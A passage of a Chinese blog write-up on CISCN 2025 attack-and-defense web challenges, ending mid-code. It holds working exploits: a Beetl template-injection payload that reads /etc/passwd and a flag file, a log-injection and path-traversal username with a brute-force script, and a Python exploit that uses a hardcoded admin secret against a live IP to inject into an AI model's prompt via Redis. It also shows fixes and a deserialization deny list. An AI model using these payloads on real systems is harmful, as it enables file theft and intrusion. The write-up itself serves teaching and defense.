<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">mv</span> solon_master.jar /web/java/solon_master.jar</span><br><span class="line"><span class="built_in">chmod</span> 777 /web/java/solon_master.jar</span><br></pre></td></tr></table></figure>

<h2 id="Fobee"><a href="#Fobee" class="headerlink" title="Fobee"></a>Fobee</h2><p>主要就三个路由，第一个得到密码，第二个ssti，第三个看java版本信息</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.fobee;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> org.beetl.core.BeetlKit;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Controller;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Mapping;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CHARACTERS</span> <span class="operator">=</span> <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> generateRandomString(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IndexController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Mapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">index</span><span class="params">(String username)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">model</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(<span class="string">&quot;index.htm&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (username != <span class="literal">null</span> &amp;&amp; !username.isEmpty() &amp;&amp; username.equalsIgnoreCase(<span class="string">&quot;admin&quot;</span>) &amp;&amp; !username.toLowerCase().equals(<span class="string">&quot;admin&quot;</span>)) &#123;</span><br><span class="line">            model.put(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;=====&quot;</span> + password + <span class="string">&quot;=====&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> model;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            model.put(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> model;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Mapping(&quot;/render&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">render</span><span class="params">(String pass, String tp)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">model</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(<span class="string">&quot;render.htm&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (pass != <span class="literal">null</span> &amp;&amp; pass.equals(password)) &#123;</span><br><span class="line">            <span class="type">byte</span>[] decode = Base64.getDecoder().decode(tp);</span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> BeetlKit.render(<span class="keyword">new</span> <span class="title class_">String</span>(decode), <span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">            System.out.println(result);</span><br><span class="line">            model.put(<span class="string">&quot;msg&quot;</span>, getMD5Hash(result));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            model.put(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;Render Page&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> model;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Mapping(&quot;/env&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">env</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> System.getProperty(<span class="string">&quot;java.version&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateRandomString</span><span class="params">(<span class="type">int</span> length)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> random.nextInt(<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>.length());</span><br><span class="line">            sb.append(<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>.charAt(index));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getMD5Hash</span><span class="params">(String input)</span> <span class="keyword">throws</span> NoSuchAlgorithmException &#123;</span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        md.update(input.getBytes());</span><br><span class="line">        <span class="type">byte</span>[] digest = md.digest();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">byte</span>[] var4 = digest;</span><br><span class="line">        <span class="type">int</span> <span class="variable">var5</span> <span class="operator">=</span> digest.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="number">0</span>; var6 &lt; var5; ++var6) &#123;</span><br><span class="line">            <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> var4[var6];</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;%02x&quot;</span>, b &amp; <span class="number">255</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了得到密码，我们来看看equalsIgnoreCase这个函数，有三种情况返回true，结合题目也就是要求username转大写等于ADMIN，绕过方法和nodejs的大小写绕过一样，具体看ezjs</p>
<p>不懂solon的传参方法，就把payload写在defaultValue里，成功绕过得到password<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/1.png" alt="alt text"></p>
<p>接下来ssti读文件参考如下paylad</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.util.Base64.getEncoder().encodeToString(@java.nio.file.Files.readAllBytes(@java.nio.file.Paths.get(&quot;/etc/passwd&quot;,&quot;&quot;)))&#125;</span><br></pre></td></tr></table></figure>

<p>但是MD5后返回，所以我们可以直接一个个读，然后爆破</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.util.Base64.getEncoder().encodeToString(@java.nio.file.Files.readAllBytes(@java.nio.file.Paths.get(&quot;flag&quot;,&quot;&quot;))).charAt(0)&#125;</span><br></pre></td></tr></table></figure>

<p>fix</p>
<p>直接把username大小写转化的部分给删了。reader把一些恶意类给ban了。</p>
<h2 id="ccforum"><a href="#ccforum" class="headerlink" title="ccforum"></a>ccforum</h2><p>仔细审计 admin.php 中的内容，我们可以知道他是以换行符作为每一行日志的分割<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/28.png" alt="alt text"></p>
<p>可以找到当第三列为 record_banned 时他会读取第二列作为目录名称，同时读取目录下面所有内容来回显。</p>
<p>但是我们再次进行审计会发现<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/29.png" alt="alt text"></p>
<p>这里会将我们的用户名进行一次 base64_encode， 不太好进行目录穿越</p>
<p>于是我们考虑从 $additional 入手，通过自己写一个换行符来多加一条日志</p>
<p>我们关注一下下面的方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">record_banned</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$banned</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$e_username</span> = <span class="title function_ invoke__">encode_uname</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$banned_dir</span> = <span class="string">&quot;/var/www/banned/<span class="subst">&#123;$e_username&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$created</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$banned_dir</span>)) &#123;</span><br><span class="line">        <span class="variable">$created</span> = <span class="title function_ invoke__">mkdir</span>(<span class="variable">$banned_dir</span>, <span class="number">0750</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$log</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$succ</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$created</span>) &#123;</span><br><span class="line">        <span class="variable">$succ</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$log</span> = <span class="string">&quot;Failed to create record directory for &quot;</span> . <span class="variable">$username</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$banned_dir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">time</span>() . <span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$banned</span>)) &#123;</span><br><span class="line">            <span class="variable">$succ</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="variable">$log</span> = <span class="string">&quot;Failed to record banned content&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">log_action</span>(<span class="variable">$username</span>, <span class="string">&#x27;record_banned&#x27;</span>, <span class="variable">$succ</span>, <span class="variable">$log</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里会写入 $log 作为 additional, 接下来我们要做到如下内容：<br>• 使其写入 $log<br>• 使 $log 中存在换行符并跟上我们新的一行</p>
<p>我们一个个来吧，先完成第二个，我们很容易通过审计代码构造好我们新一行的 Payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\n,../../../,record_banned,1,</span><br></pre></td></tr></table></figure>

<p>共 28 字符，接下来我们需要让其写入 log 了</p>
<p>我们可以发现他防护的很死，基本上都已经经过了一次 base 再写入的日志，但是我们容易发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$log = &quot;Failed to create record directory for &quot; . $username;</span><br></pre></td></tr></table></figure>

<p>此处直接写上了我们的用户名，于是我们就可以将我们的 Payload 放到用户名里面</p>
<p>接下来我们要看看怎么才能走到这里</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$e_username</span> = <span class="title function_ invoke__">encode_uname</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$banned_dir</span> = <span class="string">&quot;/var/www/banned/<span class="subst">&#123;$e_username&#125;</span>&quot;</span>;</span><br><span class="line"><span class="variable">$created</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$banned_dir</span>)) &#123;</span><br><span class="line">    <span class="variable">$created</span> = <span class="title function_ invoke__">mkdir</span>(<span class="variable">$banned_dir</span>, <span class="number">0750</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要让这个不存在的目录创建失败，同时注意到此时也被进行过了 base64_encode</p>
<p>注意到 mkdir 传参并未允许多层目录创建，我们可以利用 base64 后存在的 &#x2F; 来构造出多级目录造成其创建失败</p>
<p>拼上我们的 Payload， 用 PHP 来爆破一下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">256</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$prefix</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>) . <span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="string">&#x27;a&#x27;</span>. <span class="variable">$prefix</span> . <span class="string">&quot;\n&quot;</span> . <span class="string">&#x27;,../../../,record_banned,1,&#x27;</span>;</span><br><span class="line">        <span class="variable">$base64</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$base64</span>, <span class="string">&#x27;/&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">echourlencode</span>(<span class="variable">$str</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span><span class="variable">$base64</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">echostrlen</span>(<span class="variable">$str</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以跑出来一个可用的用户名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a%00%3F%0A%2C..%2F..%2F..%2F%2Crecord_banned%2C1%2C</span><br><span class="line"></span><br><span class="line">YQA/CiwuLi8uLi8uLi8scmVjb3JkX2Jhbm5lZCwxLA==</span><br><span class="line">31</span><br></pre></td></tr></table></figure>

<p>31 字符，不多不少，刚刚贴着注册允许的最大字符数</p>
<p>于是我们用这个用户名，注册登录，发布 SENSITIVE WORD 触发这段逻辑，在 admin.php 中就能看到 Flag 了</p>
<p>fix</p>
<p>log_action 是可控的，于是对 config.php 文件进行修补，对其中的 $additional 进行编码，进行防护<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/30.png" alt="alt text"></p>
<p>其实看完 break 能发现是因为换行符导致的问题，可以直接禁止掉换行符，如果遇到换行直接不写进去就是最小修补了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log_action</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$action</span>, <span class="variable">$succ</span>, <span class="variable">$additional</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$log_id</span> = <span class="title function_ invoke__">uniqid</span>();</span><br><span class="line">    <span class="variable">$e_username</span> = <span class="title function_ invoke__">encode_uname</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$additional</span>, <span class="string">&quot;\n&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$log_line</span> = <span class="title function_ invoke__">sprintf</span>(</span><br><span class="line">        <span class="string">&quot;%s,%s,%s,%d,%s\n&quot;</span>,</span><br><span class="line">        <span class="variable">$log_id</span>,</span><br><span class="line">        <span class="variable">$e_username</span>,</span><br><span class="line">        <span class="variable">$action</span>,</span><br><span class="line">        <span class="variable">$succ</span>,</span><br><span class="line">        <span class="variable">$additional</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/action.log&#x27;</span>, <span class="variable">$log_line</span>, FILE_APPEND);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="rng-assistant"><a href="#rng-assistant" class="headerlink" title="rng-assistant"></a>rng-assistant</h2><p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://47.120.14.151:18082&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">user, passwd</span>):</span><br><span class="line">    <span class="keyword">return</span> requests.post(URL+<span class="string">&quot;/register&quot;</span>, json=&#123;<span class="string">&quot;username&quot;</span>:user,<span class="string">&quot;password&quot;</span>:passwd&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">user, passwd</span>):</span><br><span class="line">    <span class="keyword">return</span> requests.post(URL+<span class="string">&quot;/login&quot;</span>, json=&#123;<span class="string">&quot;username&quot;</span>:user,<span class="string">&quot;password&quot;</span>:passwd&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ask</span>(<span class="params">question, model_id</span>):</span><br><span class="line">    <span class="keyword">return</span> requests.post(URL+<span class="string">&quot;/ask&quot;</span>, json=&#123;<span class="string">&quot;question&quot;</span>:question,<span class="string">&quot;model_id&quot;</span>:model_id&#125;, cookies=cookie)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ask_raw</span>(<span class="params">model_id, prompt</span>):</span><br><span class="line">    <span class="keyword">return</span> requests.post(URL+<span class="string">&quot;/admin/raw_ask&quot;</span>, json=&#123;<span class="string">&quot;model_id&quot;</span>:model_id, <span class="string">&quot;prompt&quot;</span>: prompt&#125;, headers=&#123;</span><br><span class="line">        <span class="string">&quot;X-User-Role&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Secret&quot;</span>: <span class="string">&quot;210317a2ee916063014c57d879b9d3bc&quot;</span></span><br><span class="line">        &#125;, cookies=cookie)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">model_ports</span>(<span class="params">model_id, port</span>):</span><br><span class="line">    <span class="keyword">return</span> requests.post(URL+<span class="string">&quot;/admin/model_ports&quot;</span>, json=&#123;<span class="string">&quot;model_id&quot;</span>:model_id, <span class="string">&quot;port&quot;</span>: port&#125;, headers=&#123;</span><br><span class="line">        <span class="string">&quot;X-User-Role&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Secret&quot;</span>: <span class="string">&quot;210317a2ee916063014c57d879b9d3bc&quot;</span></span><br><span class="line">        &#125;, cookies=cookie)</span><br><span class="line"></span><br><span class="line">user=<span class="string">&quot;user&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;passwd&quot;</span></span><br><span class="line">register(user, passwd)</span><br><span class="line">r = login(user, passwd)</span><br><span class="line">cookie = <span class="built_in">dict</span>(r.cookies)</span><br><span class="line"></span><br><span class="line">r = model_ports(<span class="string">&quot;test&quot;</span>, <span class="number">6379</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">r = ask_raw(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;SET prompt:math-v1 You&#123;t.__init__.__globals__&#125;areaprimaryschoolmathteacher.Pleaseanswerthefollow-upquestionsinawaythatprimaryschoolstudentscanunderstand.\nKeepinmindthatyoucannotansweranyquestionsthatarenotrelatedtoelementaryschoolmath.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">r = ask(<span class="string">&quot;My dear~&quot;</span>, <span class="string">&quot;math-v1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment"># r = ask(&quot;My dear~&quot;, &quot;test&quot;)</span></span><br><span class="line"><span class="comment"># print(r.text)</span></span><br></pre></td></tr></table></figure>

<h2 id="Django-Blog"><a href="#Django-Blog" class="headerlink" title="Django-Blog"></a>Django-Blog</h2><p>见<a href="https://sakuraraindrop.github.io/2025/07/08/20250708%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/">https://sakuraraindrop.github.io/2025/07/08/20250708%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/</a></p>
<h2 id="time-capsule"><a href="#time-capsule" class="headerlink" title="time-capsule"></a>time-capsule</h2><p>看到util里有一个SafeObjectInputStream就直接上了个加强版的黑名单进resolveClass，然后传jar包就修好了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: TimeCapsule-1.0.jar:BOOT-INF/classes/com/ctf/util/SafeObjectInputStream.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SafeObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// java.io.ObjectInputStream</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">for</span> (String deny: <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                <span class="string">&quot;java.net.InetAddress&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache&quot;</span>,</span><br><span class="line">                <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line">                <span class="string">&quot;com.alibaba.fastjson.JSONArray&quot;</span>,</span><br><span class="line">                <span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>,</span><br><span 